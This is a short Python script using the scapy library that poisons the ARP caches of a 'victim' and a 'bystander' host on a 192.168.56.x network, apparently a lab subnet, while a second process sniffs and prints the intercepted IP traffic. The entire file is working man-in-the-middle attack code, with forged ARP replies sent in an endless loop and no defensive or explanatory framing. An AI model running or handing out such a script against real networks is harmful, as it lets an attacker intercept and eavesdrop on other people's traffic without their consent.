import sys
import time
from multiprocessing import Process
from scapy.all import *

def arp_spoof(victim_ip, bystander_ip, attacker_mac):
    try:
        while True:
            send(ARP(op=2, pdst=victim_ip, psrc=bystander_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=attacker_mac), verbose=0)
            send(ARP(op=2, pdst=bystander_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=attacker_mac), verbose=0)
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)

def packet_sniffer():
    def sniff_callback(packet):
        if packet.haslayer(IP):
            print(f"Sniffed packet: {packet[IP].src} -> {packet[IP].dst}")

    sniff(prn=sniff_callback, filter="ip", store=0)

def main():
    victim_ip = "192.168.56.20"
    bystander_ip = "192.168.56.30"

    # Get the attacker's MAC address
    attacker_mac = get_if_hwaddr(conf.iface)

    # Start the ARP spoofing process
    arp_spoof_process = Process(target=arp_spoof, args=(victim_ip, bystander_ip, attacker_mac))
    arp_spoof_process.start()

    # Start the packet sniffing process
    packet_sniffer_process = Process(target=packet_sniffer)
    packet_sniffer_process.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        arp_spoof_process.terminate()
        packet_sniffer_process.terminate()

if __name__ == "__main__":
    main()
